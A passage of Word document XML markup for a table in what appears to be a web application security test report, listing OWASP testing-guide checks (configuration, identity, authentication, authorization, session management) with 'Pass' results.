          <w:p w14:paraId="5DA1590E" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00193939" w14:paraId="6613AC74"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noWrap/>
          </w:tcPr>
          <w:p w14:paraId="3429FB86" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="49A31F77"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3E33F4">
              <w:t>Fingerprint Web Application (OTG-INFO-009)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="11FB05A1" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007B584C" w:rsidRPr="00193939" w14:paraId="36F17E40"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noWrap/>
          </w:tcPr>
          <w:p w14:paraId="1BCBDC79" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="76D5CADF"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3E33F4">
              <w:t>Map Application Architecture (OTG-INFO-010)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="02D4C0B4" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00193939" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00AD7173" w14:paraId="392FABFB"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val="restart"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69853451" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Configuration and Deployment Management Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3634FAD1"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 Network/Infrastructure Configuration (OTG-CONFIG-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2986F347"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18FC3C8F"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74E59712" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="26E1740B"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rPr>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:rPr>
                <w:bCs/>
              </w:rPr>
              <w:t>Test Application Platform Configuration (OTG-CONFIG-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="322D900E"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5DECCAD2"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1FABFAC4" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="23BFE940"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 File Extensions Handling for Sensitive Information (OTG-CONFIG-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="146410FF"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5DB586A8"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="602DBF5E" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56135443"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Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E946362"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2CF57594"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17FBD5FE" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="334D2786"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rPr>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:rPr>
                <w:bCs/>
              </w:rPr>
              <w:t>Enumerate Infrastructure and Application Admin Interfaces (OTG-CONFIG-005)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="31F206A3"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rPr>
                <w:bCs/>
                <w:color w:val="FF0000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:rPr>
                <w:bCs/>
              </w:rPr>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007B584C" w:rsidRPr="00AD7173" w14:paraId="3DF764C9"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5FAC8ADA" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7957B019"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 HTTP Methods (OTG-CONFIG-006)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="340BA64B"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6436522E"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56E24F2E" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43048196"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 HTTP Strict Transport Security (OTG-CONFIG-007)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EEC2439"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7B584C" w:rsidRPr="00AD7173" w14:paraId="111E5012"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hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12FBA6C0" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B38C6C6"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 RIA cross domain policy (OTG-CONFIG-008)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C2E8E85"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0CE31BFD"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2F28E84" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Identity Management Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3E523ED6"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 Role Definitions (OTG-IDENT-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="74416C42"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0497099D"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7FB55DB2" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6BD87CFB"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bookmarkStart w:id="26" w:name="_Hlk15996155"/>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Test User Registration Process (OTG-IDENT-002)</w:t>
            </w:r>
            <w:bookmarkEnd w:id="26"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="6B3FAB2F"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7F7DE6FB"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31586FED" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="28CAB12A"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 Account Provisioning Process (OTG-IDENT-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="02FB587A"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33C08C95"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1C1320E7" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="24E1EFBF"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Account Enumeration and Guessable User Account (OTG-IDENT-004)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="0AB74436"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rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00AD7173" w14:paraId="2BB90795"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7CDDF61C" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A378309"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Weak or Unenforced Username Policy (OTG-IDENT-005)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="6EAADBA4"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666C88C6"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464B345" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Authentication Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="563E5D98"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rPr>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:rPr>
                <w:bCs/>
              </w:rPr>
              <w:t>Testing for Credentials Transported over an Encrypted Channel (OTG-AUTHN-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="3199700E"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rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00AD7173" w14:paraId="776D1167"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6CC7FCE7" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F3E161D"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Default Credentials (OTG-AUTHN-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="1BE33B77"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10DB55ED"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2E41A012" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="26A68B90"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Weak Lock Out Mechanism (OTG-AUTHN-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="5E44CF8E"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230CEA11"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97C28AF" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B319545"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Bypassing Authentication Schema (OTG-AUTHN-004)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="78384DC8"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0EAA1923"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17C641E" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5C19B9D9"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 Remember Password Functionality (OTG-AUTHN-005)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="61FBA9B3"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040ED1BD"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2E9316C7" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5BDD9992"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Browser Cache Weakness (OTG-AUTHN-006)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="5F59689A"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7974636D"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790E174" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C25F5E9"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Weak Password Policy (OTG-AUTHN-007)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="7757AC28"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5C2EF7DA"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01175831" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="779F128F"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Weak Security Questio</w:t>
            </w:r>
            <w:r>
              <w:t>n/A</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD7173">
              <w:t>nswer (OTG-AUTHN-008)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="2C97F216"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6631B883"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10E75970" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="165EDF1A"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Weak Password Change or Reset Functionalities (OTG-AUTHN-009)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="50A1B1E0"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74ED3213"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1C806723" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="050172A0"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Weaker Authentication in Alternative Channel (OTG-AUTHN-010)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="23970D7D"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18DD71FE"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AA6EF8C" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Authorization Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0140B663"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Directory Traversal/File Include (OTG-AUTHZ-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="2AA1B65A"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0D892518"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026ACD58" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="56545D4E"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Bypassing Authorization Schema (OTG-AUTHZ-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="7D8C6199"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7EB37BF3"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6160BC98" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="572FF9DF"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Privilege Escalation (OTG-AUTHZ-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="6691B401"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620B2303"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6A72791" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15A5BD1F"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Insecure Direct Object References (OTG-AUTHZ-004)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="125500C4"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4199F732"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04B12B0" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Session Management Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B18D9A8"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Bypassing Session Management Schema (OTG-SESS-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="4362D534"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3E5E03C8"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AAD01B2" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A26DCE8"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Cookies Attributes (OTG-SESS-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="6FF5A8EA"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54A75287"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37C3E35A" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="70F5C969"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Session Fixation (OTG-SESS-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="203CB98E"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742BF97F"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3215EBFF" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0E0B5F25"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Exposed Session Variables (OTG-SESS-004)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="654DC92F"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7B584C" w:rsidRPr="00AD7173" w14:paraId="04C73D46"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560F6CC7" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
